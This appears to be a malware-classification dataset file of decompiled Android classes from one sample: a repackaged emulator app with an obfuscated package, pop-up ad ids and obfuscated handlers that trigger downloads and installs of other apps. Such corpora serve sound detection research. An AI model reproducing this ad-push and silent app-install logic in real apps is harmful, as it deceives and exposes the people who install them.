"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.widget\ViewDragCallback.code","public class ViewDragCallback extends ViewDragHelper.Callback {   private final int mAbsGravity;   private ViewDragHelper mDragger;   private final Runnable mPeekRunnable=new Runnable(){     @Override public void run(){       ViewDragCallback.this.peekDrawer();     }   } ;   public ViewDragCallback(  int gravity){     this.mAbsGravity=gravity;   }   public void setDragger(  ViewDragHelper dragger){     this.mDragger=dragger;   }   public void removeCallbacks(){     DrawerLayout.this.removeCallbacks(this.mPeekRunnable);   }   @Override public boolean tryCaptureView(  View child,  int pointerId){     return (DrawerLayout.this.isDrawerView(child) && DrawerLayout.this.checkDrawerViewAbsoluteGravity(child,this.mAbsGravity) && DrawerLayout.this.getDrawerLockMode(child) == 0) ? DrawerLayout.CHILDREN_DISALLOW_INTERCEPT : DrawerLayout.ALLOW_EDGE_LOCK;   }   @Override public void onViewDragStateChanged(  int state){     DrawerLayout.this.updateDrawerState(this.mAbsGravity,state,this.mDragger.getCapturedView());   }   @Override public void onViewPositionChanged(  View changedView,  int left,  int top,  int dx,  int dy){     float offset;     int childWidth=changedView.getWidth();     if (DrawerLayout.this.checkDrawerViewAbsoluteGravity(changedView,3)) {       offset=(childWidth + left) / childWidth;     }  else {       int width=DrawerLayout.this.getWidth();       offset=(width - left) / childWidth;     }     DrawerLayout.this.setDrawerViewOffset(changedView,offset);     changedView.setVisibility(offset == 0.0f ? 4 : 0);     DrawerLayout.this.invalidate();   }   @Override public void onViewCaptured(  View capturedChild,  int activePointerId){     LayoutParams lp=(LayoutParams)capturedChild.getLayoutParams();     lp.isPeeking=DrawerLayout.ALLOW_EDGE_LOCK;     closeOtherDrawer();   }   private void closeOtherDrawer(){     int otherGrav=this.mAbsGravity == 3 ? 5 : 3;     View toClose=DrawerLayout.this.findDrawerWithGravity(otherGrav);     if (toClose != null) {       DrawerLayout.this.closeDrawer(toClose);     }   }   @Override public void onViewReleased(  View releasedChild,  float xvel,  float yvel){     int left;     float offset=DrawerLayout.this.getDrawerViewOffset(releasedChild);     int childWidth=releasedChild.getWidth();     if (DrawerLayout.this.checkDrawerViewAbsoluteGravity(releasedChild,3)) {       left=(xvel > 0.0f || (xvel == 0.0f && offset > 0.5f)) ? 0 : -childWidth;     }  else {       int width=DrawerLayout.this.getWidth();       left=(xvel < 0.0f || (xvel == 0.0f && offset > 0.5f)) ? width - childWidth : width;     }     this.mDragger.settleCapturedViewAt(left,releasedChild.getTop());     DrawerLayout.this.invalidate();   }   @Override public void onEdgeTouched(  int edgeFlags,  int pointerId){     DrawerLayout.this.postDelayed(this.mPeekRunnable,160L);   }   public void peekDrawer(){     View toCapture;     int childLeft;     int peekDistance=this.mDragger.getEdgeSize();     boolean leftEdge=this.mAbsGravity == 3;     if (leftEdge) {       toCapture=DrawerLayout.this.findDrawerWithGravity(3);       childLeft=(toCapture != null ? -toCapture.getWidth() : 0) + peekDistance;     }  else {       toCapture=DrawerLayout.this.findDrawerWithGravity(5);       childLeft=DrawerLayout.this.getWidth() - peekDistance;     }     if (toCapture != null) {       if (((leftEdge && toCapture.getLeft() < childLeft) || (!leftEdge && toCapture.getLeft() > childLeft)) && DrawerLayout.this.getDrawerLockMode(toCapture) == 0) {         LayoutParams lp=(LayoutParams)toCapture.getLayoutParams();         this.mDragger.smoothSlideViewTo(toCapture,childLeft,toCapture.getTop());         lp.isPeeking=DrawerLayout.CHILDREN_DISALLOW_INTERCEPT;         DrawerLayout.this.invalidate();         closeOtherDrawer();         DrawerLayout.this.cancelChildViewTouch();       }     }   }   @Override public boolean onEdgeLock(  int edgeFlags){     return DrawerLayout.ALLOW_EDGE_LOCK;   }   @Override public void onEdgeDragStarted(  int edgeFlags,  int pointerId){     View toCapture;     if ((edgeFlags & 1) == 1) {       toCapture=DrawerLayout.this.findDrawerWithGravity(3);     }  else {       toCapture=DrawerLayout.this.findDrawerWithGravity(5);     }     if (toCapture != null && DrawerLayout.this.getDrawerLockMode(toCapture) == 0) {       this.mDragger.captureChildView(toCapture,pointerId);     }   }   @Override public int getViewHorizontalDragRange(  View child){     return child.getWidth();   }   @Override public int clampViewPositionHorizontal(  View child,  int left,  int dx){     if (DrawerLayout.this.checkDrawerViewAbsoluteGravity(child,3)) {       return Math.max(-child.getWidth(),Math.min(left,0));     }     int width=DrawerLayout.this.getWidth();     return Math.max(width - child.getWidth(),Math.min(left,width));   }   @Override public int clampViewPositionVertical(  View child,  int top,  int dy){     return child.getTop();   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.widget\ViewDragHelper.code","!org.eclipse.jdt.core.dom.TypeDeclaration@c636178"
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw\array.code","public static final class array {   public static final int file_chooser_filters=0x7f050000;   public static final int scaling_mode_entryvalues=0x7f050001;   public static final int aspect_ratio_entryvalues=0x7f050002;   public static final int fast_forward_speed_entryvalues=0x7f050003;   public static final int frame_skip_entryvalues=0x7f050004;   public static final int refresh_rate_entryvalues=0x7f050005;   public static final int second_controller_entryvalues=0x7f050006;   public static final int vkeypad_size_entryvalues=0x7f050007;   public static final int vkeypad_layout_entryvalues=0x7f050008;   public static final int orientation_entryvalues=0x7f050009;   public static final int auto_sync_client_entryvalues=0x7f05000a;   public static final int exit_game_options=0x7f05000b;   public static final int scaling_mode_entries=0x7f05000c;   public static final int aspect_ratio_entries=0x7f05000d;   public static final int frame_skip_entries=0x7f05000e;   public static final int refresh_rate_entries=0x7f05000f;   public static final int second_controller_entries=0x7f050010;   public static final int vkeypad_size_entries=0x7f050011;   public static final int vkeypad_layout_entries=0x7f050012;   public static final int orientation_entries=0x7f050013;   public static final int auto_sync_client_entries=0x7f050014; } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw\drawable.code","public static final class drawable {   public static final int buttons=0x7f020000;   public static final int dpad=0x7f020001;   public static final int extra_buttons=0x7f020002;   public static final int icon=0x7f020003;   public static final int select_start_buttons=0x7f020004; } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw\id.code","public static final class id {   public static final int back_ad=0x7f080000;   public static final int emulator=0x7f080001;   public static final int float_pop_ad=0x7f080002;   public static final int profile_name=0x7f080003;   public static final int value=0x7f080004;   public static final int seekbar=0x7f080005;   public static final int screenshot=0x7f080006;   public static final int name=0x7f080007;   public static final int detail=0x7f080008;   public static final int menu_load_state=0x7f080009;   public static final int menu_save_state=0x7f08000a;   public static final int menu_settings=0x7f08000b;   public static final int menu_reset=0x7f08000c;   public static final int menu_close=0x7f08000d;   public static final int menu_new_profile=0x7f08000e;   public static final int menu_search_roms=0x7f08000f;   public static final int menu_help=0x7f080010; } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw\layout.code","public static final class layout {   public static final int emulator=0x7f030000;   public static final int new_profile=0x7f030001;   public static final int seekbar_dialog=0x7f030002;   public static final int state_slot_item=0x7f030003; } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw\Main.code","public class Main extends EmulatorActivity { } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw\menu.code","public static final class menu {   public static final int emulator=0x7f070000;   public static final int key_profiles=0x7f070001;   public static final int main=0x7f070002; } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw\R.code","public final class R { public static final class drawable {     public static final int buttons=0x7f020000;     public static final int dpad=0x7f020001;     public static final int extra_buttons=0x7f020002;     public static final int icon=0x7f020003;     public static final int select_start_buttons=0x7f020004;   } public static final class layout {     public static final int emulator=0x7f030000;     public static final int new_profile=0x7f030001;     public static final int seekbar_dialog=0x7f030002;     public static final int state_slot_item=0x7f030003;   } public static final class xml {     public static final int preferences=0x7f040000;   } public static final class array {     public static final int file_chooser_filters=0x7f050000;     public static final int scaling_mode_entryvalues=0x7f050001;     public static final int aspect_ratio_entryvalues=0x7f050002;     public static final int fast_forward_speed_entryvalues=0x7f050003;     public static final int frame_skip_entryvalues=0x7f050004;     public static final int refresh_rate_entryvalues=0x7f050005;     public static final int second_controller_entryvalues=0x7f050006;     public static final int vkeypad_size_entryvalues=0x7f050007;     public static final int vkeypad_layout_entryvalues=0x7f050008;     public static final int orientation_entryvalues=0x7f050009;     public static final int auto_sync_client_entryvalues=0x7f05000a;     public static final int exit_game_options=0x7f05000b;     public static final int scaling_mode_entries=0x7f05000c;     public static final int aspect_ratio_entries=0x7f05000d;     public static final int frame_skip_entries=0x7f05000e;     public static final int refresh_rate_entries=0x7f05000f;     public static final int second_controller_entries=0x7f050010;     public static final int vkeypad_size_entries=0x7f050011;     public static final int vkeypad_layout_entries=0x7f050012;     public static final int orientation_entries=0x7f050013;     public static final int auto_sync_client_entries=0x7f050014;   } public static final class string {     public static final int app_label=0x7f060000;     public static final int emulator_service_running=0x7f060001;     public static final int launcher_shortcut_name=0x7f060002;     public static final int menu_edit=0x7f060003;     public static final int menu_delete=0x7f060004;     public static final int title_select_rom=0x7f060005;     public static final int no_files_in_folder=0x7f060006;     public static final int invalid_dir=0x7f060007;     public static final int refresh=0x7f060008;     public static final int shortcut_name=0x7f060009;     public static final int search_roms=0x7f06000a;     public static final int help=0x7f06000b;     public static final int load_rom_failed=0x7f06000c;     public static final int rom_not_supported=0x7f06000d;     public static final int replace_game_title=0x7f06000e;     public static final int replace_game_message=0x7f06000f;     public static final int quit_game_title=0x7f060010;     public static final int load_state_title=0x7f060011;     public static final int save_state_title=0x7f060012;     public static final int slot_quick=0x7f060013;     public static final int slot_nth=0x7f060014;     public static final int slot_empty=0x7f060015;     public static final int settings=0x7f060016;     public static final int reset=0x7f060017;     public static final int power=0x7f060018;     public static final int change_disk=0x7f060019;     public static final int disk_side=0x7f06001a;     public static final int netplay_connect=0x7f06001b;     public static final int netplay_disconnect=0x7f06001c;     public static final int wifi_server=0x7f06001d;     public static final int wifi_client=0x7f06001e;     public static final int bluetooth_server=0x7f06001f;     public static final int bluetooth_client=0x7f060020;     public static final int netplay_sync=0x7f060021;     public static final int fast_forward=0x7f060022;     public static final int no_fast_forward=0x7f060023;     public static final int screenshot=0x7f060024;     public static final int screenshot_saved=0x7f060025;     public static final int save_state=0x7f060026;     public static final int load_state=0x7f060027;     public static final int close=0x7f060028;     public static final int connection_closed=0x7f060029;     public static final int connect_failed=0x7f06002a;     public static final int protocol_incompatible=0x7f06002b;     public static final int wifi_not_available=0x7f06002c;     public static final int wifi_server_listening=0x7f06002d;     public static final int client_connecting=0x7f06002e;     public static final int bluetooth_server_listening=0x7f06002f;     public static final int ip_address=0x7f060030;     public static final int port=0x7f060031;     public static final int invalid_ip_address=0x7f060032;     public static final int invalid_port=0x7f060033;     public static final int key_profiles=0x7f060034;     public static final int new_profile=0x7f060035;     public static final int new_profile_title=0x7f060036;     public static final int new_profile_error=0x7f060037;     public static final int load_profile=0x7f060038;     public static final int save_profile=0x7f060039;     public static final int scanning=0x7f06003a;     public static final int select_device=0x7f06003b;     public static final int none_paired=0x7f06003c;     public static final int none_found=0x7f06003d;     public static final int title_paired_devices=0x7f06003e;     public static final int title_other_devices=0x7f06003f;     public static final int button_scan=0x7f060040;     public static final int audio_video_settings=0x7f060041;     public static final int audio_settings=0x7f060042;     public static final int enable_sound=0x7f060043;     public static final int sound_volume=0x7f060044;     public static final int video_settings=0x7f060045;     public static final int scaling_mode=0x7f060046;     public static final int aspect_ratio=0x7f060047;     public static final int fast_forward_speed=0x7f060048;     public static final int frame_skip_settings=0x7f060049;     public static final int frame_skip_mode=0x7f06004a;     public static final int max_frame_skips=0x7f06004b;     public static final int max_frame_skips_summary=0x7f06004c;     public static final int refresh_rate=0x7f06004d;     public static final int refresh_rate_summary=0x7f06004e;     public static final int accurate_rendering=0x7f06004f;     public static final int accurate_rendering_summary=0x7f060050;     public static final int accurate_rendering_prompt=0x7f060051;     public static final int input_settings=0x7f060052;     public static final int second_controller=0x7f060053;     public static final int second_controller_summary=0x7f060054;     public static final int key_mappings=0x7f060055;     public static final int key_mappings_summary=0x7f060056;     public static final int gamepad_1=0x7f060057;     public static final int gamepad_2=0x7f060058;     public static final int shortcut_keys=0x7f060059;     public static final int quick_load=0x7f06005a;     public static final int quick_save=0x7f06005b;     public static final int vkeypad_settings=0x7f06005c;     public static final int vkeypad_settings_summary=0x7f06005d;     public static final int enable_vibrator=0x7f06005e;     public static final int enable_vkeypad=0x7f06005f;     public static final int multitouch_unsupported=0x7f060060;     public static final int dpad_4way=0x7f060061;     public static final int dpad_deadzone=0x7f060062;     public static final int two_buttons_press=0x7f060063;     public static final int in_between_press=0x7f060064;     public static final int in_between_press_summary=0x7f060065;     public static final int point_size_press=0x7f060066;     public static final int point_size_press_summary=0x7f060067;     public static final int point_size_press_threshold=0x7f060068;     public static final int appearance=0x7f060069;     public static final int vkeypad_size=0x7f06006a;     public static final int vkeypad_transparency=0x7f06006b;     public static final int hide_controls=0x7f06006c;     public static final int hide_dpad=0x7f06006d;     public static final int hide_buttons=0x7f06006e;     public static final int hide_extra_buttons=0x7f06006f;     public static final int disable_extra_buttons=0x7f060070;     public static final int hide_select_start=0x7f060071;     public static final int vkeypad_layout=0x7f060072;     public static final int layout_margin=0x7f060073;     public static final int enable_trackball=0x7f060074;     public static final int trackball_sensitivity=0x7f060075;     public static final int enable_sensor=0x7f060076;     public static final int sensor_sensitivity=0x7f060077;     public static final int netplay_settings=0x7f060078;     public static final int max_frames_ahead=0x7f060079;     public static final int max_frames_ahead_summary=0x7f06007a;     public static final int auto_sync_client=0x7f06007b;     public static final int auto_sync_client_interval=0x7f06007c;     public static final int other_settings=0x7f06007d;     public static final int cheating=0x7f06007e;     public static final int enable_game_genie=0x7f06007f;     public static final int bios=0x7f060080;     public static final int game_genie_rom=0x7f060081;     public static final int fds_rom=0x7f060082;     public static final int user_settings=0x7f060083;     public static final int flip_screen=0x7f060084;     public static final int flip_screen_summary=0x7f060085;     public static final int full_screen_mode=0x7f060086;     public static final int full_screen_mode_summary=0x7f060087;     public static final int orientation=0x7f060088;     public static final int orientation_summary=0x7f060089;     public static final int quick_load_on_start=0x7f06008a;     public static final int quick_load_on_start_summary=0x7f06008b;     public static final int use_input_method=0x7f06008c;     public static final int use_input_method_summary=0x7f06008d;     public static final int app_about=0x7f06008e;     public static final int about=0x7f06008f;     public static final int upgrade=0x7f060090;     public static final int press_key_prompt=0x7f060091;     public static final int key_none=0x7f060092;     public static final int key_unknown=0x7f060093;     public static final int key_clear=0x7f060094;     public static final int gamepad_up=0x7f060095;     public static final int gamepad_down=0x7f060096;     public static final int gamepad_left=0x7f060097;     public static final int gamepad_right=0x7f060098;     public static final int gamepad_up_left=0x7f060099;     public static final int gamepad_up_right=0x7f06009a;     public static final int gamepad_down_left=0x7f06009b;     public static final int gamepad_down_right=0x7f06009c;     public static final int gamepad_select=0x7f06009d;     public static final int gamepad_start=0x7f06009e;     public static final int gamepad_A=0x7f06009f;     public static final int gamepad_B=0x7f0600a0;     public static final int gamepad_A_turbo=0x7f0600a1;     public static final int gamepad_B_turbo=0x7f0600a2;     public static final int gamepad_AB=0x7f0600a3;   } public static final class menu {     public static final int emulator=0x7f070000;     public static final int key_profiles=0x7f070001;     public static final int main=0x7f070002;   } public static final class id {     public static final int back_ad=0x7f080000;     public static final int emulator=0x7f080001;     public static final int float_pop_ad=0x7f080002;     public static final int profile_name=0x7f080003;     public static final int value=0x7f080004;     public static final int seekbar=0x7f080005;     public static final int screenshot=0x7f080006;     public static final int name=0x7f080007;     public static final int detail=0x7f080008;     public static final int menu_load_state=0x7f080009;     public static final int menu_save_state=0x7f08000a;     public static final int menu_settings=0x7f08000b;     public static final int menu_reset=0x7f08000c;     public static final int menu_close=0x7f08000d;     public static final int menu_new_profile=0x7f08000e;     public static final int menu_search_roms=0x7f08000f;     public static final int menu_help=0x7f080010;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw\string.code","public static final class string {   public static final int app_label=0x7f060000;   public static final int emulator_service_running=0x7f060001;   public static final int launcher_shortcut_name=0x7f060002;   public static final int menu_edit=0x7f060003;   public static final int menu_delete=0x7f060004;   public static final int title_select_rom=0x7f060005;   public static final int no_files_in_folder=0x7f060006;   public static final int invalid_dir=0x7f060007;   public static final int refresh=0x7f060008;   public static final int shortcut_name=0x7f060009;   public static final int search_roms=0x7f06000a;   public static final int help=0x7f06000b;   public static final int load_rom_failed=0x7f06000c;   public static final int rom_not_supported=0x7f06000d;   public static final int replace_game_title=0x7f06000e;   public static final int replace_game_message=0x7f06000f;   public static final int quit_game_title=0x7f060010;   public static final int load_state_title=0x7f060011;   public static final int save_state_title=0x7f060012;   public static final int slot_quick=0x7f060013;   public static final int slot_nth=0x7f060014;   public static final int slot_empty=0x7f060015;   public static final int settings=0x7f060016;   public static final int reset=0x7f060017;   public static final int power=0x7f060018;   public static final int change_disk=0x7f060019;   public static final int disk_side=0x7f06001a;   public static final int netplay_connect=0x7f06001b;   public static final int netplay_disconnect=0x7f06001c;   public static final int wifi_server=0x7f06001d;   public static final int wifi_client=0x7f06001e;   public static final int bluetooth_server=0x7f06001f;   public static final int bluetooth_client=0x7f060020;   public static final int netplay_sync=0x7f060021;   public static final int fast_forward=0x7f060022;   public static final int no_fast_forward=0x7f060023;   public static final int screenshot=0x7f060024;   public static final int screenshot_saved=0x7f060025;   public static final int save_state=0x7f060026;   public static final int load_state=0x7f060027;   public static final int close=0x7f060028;   public static final int connection_closed=0x7f060029;   public static final int connect_failed=0x7f06002a;   public static final int protocol_incompatible=0x7f06002b;   public static final int wifi_not_available=0x7f06002c;   public static final int wifi_server_listening=0x7f06002d;   public static final int client_connecting=0x7f06002e;   public static final int bluetooth_server_listening=0x7f06002f;   public static final int ip_address=0x7f060030;   public static final int port=0x7f060031;   public static final int invalid_ip_address=0x7f060032;   public static final int invalid_port=0x7f060033;   public static final int key_profiles=0x7f060034;   public static final int new_profile=0x7f060035;   public static final int new_profile_title=0x7f060036;   public static final int new_profile_error=0x7f060037;   public static final int load_profile=0x7f060038;   public static final int save_profile=0x7f060039;   public static final int scanning=0x7f06003a;   public static final int select_device=0x7f06003b;   public static final int none_paired=0x7f06003c;   public static final int none_found=0x7f06003d;   public static final int title_paired_devices=0x7f06003e;   public static final int title_other_devices=0x7f06003f;   public static final int button_scan=0x7f060040;   public static final int audio_video_settings=0x7f060041;   public static final int audio_settings=0x7f060042;   public static final int enable_sound=0x7f060043;   public static final int sound_volume=0x7f060044;   public static final int video_settings=0x7f060045;   public static final int scaling_mode=0x7f060046;   public static final int aspect_ratio=0x7f060047;   public static final int fast_forward_speed=0x7f060048;   public static final int frame_skip_settings=0x7f060049;   public static final int frame_skip_mode=0x7f06004a;   public static final int max_frame_skips=0x7f06004b;   public static final int max_frame_skips_summary=0x7f06004c;   public static final int refresh_rate=0x7f06004d;   public static final int refresh_rate_summary=0x7f06004e;   public static final int accurate_rendering=0x7f06004f;   public static final int accurate_rendering_summary=0x7f060050;   public static final int accurate_rendering_prompt=0x7f060051;   public static final int input_settings=0x7f060052;   public static final int second_controller=0x7f060053;   public static final int second_controller_summary=0x7f060054;   public static final int key_mappings=0x7f060055;   public static final int key_mappings_summary=0x7f060056;   public static final int gamepad_1=0x7f060057;   public static final int gamepad_2=0x7f060058;   public static final int shortcut_keys=0x7f060059;   public static final int quick_load=0x7f06005a;   public static final int quick_save=0x7f06005b;   public static final int vkeypad_settings=0x7f06005c;   public static final int vkeypad_settings_summary=0x7f06005d;   public static final int enable_vibrator=0x7f06005e;   public static final int enable_vkeypad=0x7f06005f;   public static final int multitouch_unsupported=0x7f060060;   public static final int dpad_4way=0x7f060061;   public static final int dpad_deadzone=0x7f060062;   public static final int two_buttons_press=0x7f060063;   public static final int in_between_press=0x7f060064;   public static final int in_between_press_summary=0x7f060065;   public static final int point_size_press=0x7f060066;   public static final int point_size_press_summary=0x7f060067;   public static final int point_size_press_threshold=0x7f060068;   public static final int appearance=0x7f060069;   public static final int vkeypad_size=0x7f06006a;   public static final int vkeypad_transparency=0x7f06006b;   public static final int hide_controls=0x7f06006c;   public static final int hide_dpad=0x7f06006d;   public static final int hide_buttons=0x7f06006e;   public static final int hide_extra_buttons=0x7f06006f;   public static final int disable_extra_buttons=0x7f060070;   public static final int hide_select_start=0x7f060071;   public static final int vkeypad_layout=0x7f060072;   public static final int layout_margin=0x7f060073;   public static final int enable_trackball=0x7f060074;   public static final int trackball_sensitivity=0x7f060075;   public static final int enable_sensor=0x7f060076;   public static final int sensor_sensitivity=0x7f060077;   public static final int netplay_settings=0x7f060078;   public static final int max_frames_ahead=0x7f060079;   public static final int max_frames_ahead_summary=0x7f06007a;   public static final int auto_sync_client=0x7f06007b;   public static final int auto_sync_client_interval=0x7f06007c;   public static final int other_settings=0x7f06007d;   public static final int cheating=0x7f06007e;   public static final int enable_game_genie=0x7f06007f;   public static final int bios=0x7f060080;   public static final int game_genie_rom=0x7f060081;   public static final int fds_rom=0x7f060082;   public static final int user_settings=0x7f060083;   public static final int flip_screen=0x7f060084;   public static final int flip_screen_summary=0x7f060085;   public static final int full_screen_mode=0x7f060086;   public static final int full_screen_mode_summary=0x7f060087;   public static final int orientation=0x7f060088;   public static final int orientation_summary=0x7f060089;   public static final int quick_load_on_start=0x7f06008a;   public static final int quick_load_on_start_summary=0x7f06008b;   public static final int use_input_method=0x7f06008c;   public static final int use_input_method_summary=0x7f06008d;   public static final int app_about=0x7f06008e;   public static final int about=0x7f06008f;   public static final int upgrade=0x7f060090;   public static final int press_key_prompt=0x7f060091;   public static final int key_none=0x7f060092;   public static final int key_unknown=0x7f060093;   public static final int key_clear=0x7f060094;   public static final int gamepad_up=0x7f060095;   public static final int gamepad_down=0x7f060096;   public static final int gamepad_left=0x7f060097;   public static final int gamepad_right=0x7f060098;   public static final int gamepad_up_left=0x7f060099;   public static final int gamepad_up_right=0x7f06009a;   public static final int gamepad_down_left=0x7f06009b;   public static final int gamepad_down_right=0x7f06009c;   public static final int gamepad_select=0x7f06009d;   public static final int gamepad_start=0x7f06009e;   public static final int gamepad_A=0x7f06009f;   public static final int gamepad_B=0x7f0600a0;   public static final int gamepad_A_turbo=0x7f0600a1;   public static final int gamepad_B_turbo=0x7f0600a2;   public static final int gamepad_AB=0x7f0600a3; } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw\xml.code","public static final class xml {   public static final int preferences=0x7f040000; } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.a\a.code","class a implements View.OnClickListener {   final Uj f28a;   public a(  Uj uj){     this.f28a=uj;   }   @Override public void onClick(  View view){     Activity activity;     activity=this.f28a.g;     activity.finish();   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.a\b.code","class b extends Handler {   final Uj f38a;   public b(  Uj uj){     this.f38a=uj;   }   @Override public void handleMessage(  Message message){     com.apkmore.rbjatnldymzfiw.a.d.i iVar;     Activity activity;     Activity activity2;     com.apkmore.rbjatnldymzfiw.a.d.i iVar2;     Activity activity3;     List list;     com.apkmore.rbjatnldymzfiw.a.d.i iVar3;     List list2;     List list3;     List list4;     com.apkmore.rbjatnldymzfiw.a.c.e unused;     super.handleMessage(message);     iVar=this.f38a.l;     if (iVar != null) {       if (message.what == 0) {         new c(this).start();         return;       }       if (message.what == 1) {         Uj uj=this.f38a;         activity=this.f38a.g;         uj.m=com.apkmore.rbjatnldymzfiw.a.c.e.a(activity);         unused=this.f38a.m;         activity2=this.f38a.g;         com.apkmore.rbjatnldymzfiw.a.c.e.b(activity2);         try {           list2=this.f38a.j;           if (list2 != null) {             list3=this.f38a.j;             if (list3.size() < 20) {               Uj.f26a=true;               for (int i=0; i < com.apkmore.rbjatnldymzfiw.a.c.e.c.size(); i++) {                 com.apkmore.rbjatnldymzfiw.a.b.b bVar=new com.apkmore.rbjatnldymzfiw.a.b.b();                 bVar.f=(String)com.apkmore.rbjatnldymzfiw.a.c.e.c.get(i);                 list4=this.f38a.j;                 list4.add(bVar);               }             }           }         }  catch (        Exception e) {         }         iVar2=this.f38a.l;         activity3=this.f38a.g;         list=this.f38a.j;         iVar2.a(activity3,list);         iVar3=this.f38a.l;         iVar3.a(false);       }     }   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.a\c.code","class c extends Thread {   final b f42a;   public c(  b bVar){     this.f42a=bVar;   }   @Override public void run(){     Activity activity;     super.run();     activity=this.f42a.f38a.g;     List b=com.apkmore.rbjatnldymzfiw.a.c.h.b((Context)activity,true);     if (b != null) {       this.f42a.f38a.j=b;       this.f42a.f38a.d.sendEmptyMessage(1);     }   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.a\d.code","public class d implements AdapterView.OnItemClickListener {   final Uj f50a;   public d(  Uj uj){     this.f50a=uj;   }   @Override public void onItemClick(  AdapterView adapterView,  View view,  int i,  long j){     List list;     Activity activity;     com.apkmore.rbjatnldymzfiw.a.c.e eVar;     Activity activity2;     Activity activity3;     Map map;     Map map2;     Map map3;     Activity activity4;     Activity activity5;     Activity activity6;     Activity activity7;     Activity activity8;     com.apkmore.rbjatnldymzfiw.a.c.e unused;     list=this.f50a.j;     com.apkmore.rbjatnldymzfiw.a.b.b bVar=(com.apkmore.rbjatnldymzfiw.a.b.b)list.get(i);     String str=bVar.b;     int i2=bVar.e;     Uj uj=this.f50a;     activity=this.f50a.g;     uj.m=com.apkmore.rbjatnldymzfiw.a.c.e.a(activity);     if (com.apkmore.rbjatnldymzfiw.a.c.e.c.contains(bVar.f)) {       String str2=bVar.f;       activity8=this.f50a.g;       com.apkmore.rbjatnldymzfiw.a.c.h.a(str2,activity8);       return;     }     eVar=this.f50a.m;     unused=this.f50a.m;     if (eVar.a(com.apkmore.rbjatnldymzfiw.a.c.e.a(com.apkmore.rbjatnldymzfiw.a.c.e.a(str)),i2)) {       activity5=this.f50a.g;       if (!com.apkmore.rbjatnldymzfiw.a.c.h.c(activity5,com.apkmore.rbjatnldymzfiw.a.c.h.a(i2) + ""/"" + com.apkmore.rbjatnldymzfiw.a.c.e.a(str))) {         activity7=this.f50a.g;         com.apkmore.rbjatnldymzfiw.a.a.b.a(str,activity7,1,bVar.f,bVar.e,bVar.d);         return;       }  else {         try {           String str3=bVar.b;           activity6=this.f50a.g;           com.apkmore.rbjatnldymzfiw.a.c.h.a(str3,activity6,i2,bVar);           return;         }  catch (        Exception e) {           return;         }       }     }     activity2=this.f50a.g;     if (com.apkmore.rbjatnldymzfiw.a.c.h.f(activity2) == null) {       activity3=this.f50a.g;       com.apkmore.rbjatnldymzfiw.a.c.h.g(activity3);       return;     }     if (com.apkmore.rbjatnldymzfiw.a.a.c.b.get(bVar.b) == null) {       com.apkmore.rbjatnldymzfiw.a.a.c.b.put(bVar.b,new String[]{bVar.b,bVar.f,"""" + bVar.e,bVar.d});       TextView textView=(TextView)com.apkmore.rbjatnldymzfiw.a.a.i.f35a.get(bVar.b);       if (textView != null) {         textView.setText(com.apkmore.rbjatnldymzfiw.a.c.b.az);       }       if (com.apkmore.rbjatnldymzfiw.a.a.c.c.size() < 3) {         String str4=bVar.b;         activity4=this.f50a.g;         com.apkmore.rbjatnldymzfiw.a.a.b.a(str4,activity4,1,bVar.f,bVar.e,bVar.d);         return;       }       map=this.f50a.e;       if (map.size() == 0) {         map3=this.f50a.e;         map3.put(1,0);       }       String str5=bVar.f;       map2=this.f50a.e;       com.apkmore.rbjatnldymzfiw.a.a.k.a(str,str5,map2,bVar.e,bVar.d);     }   } } "
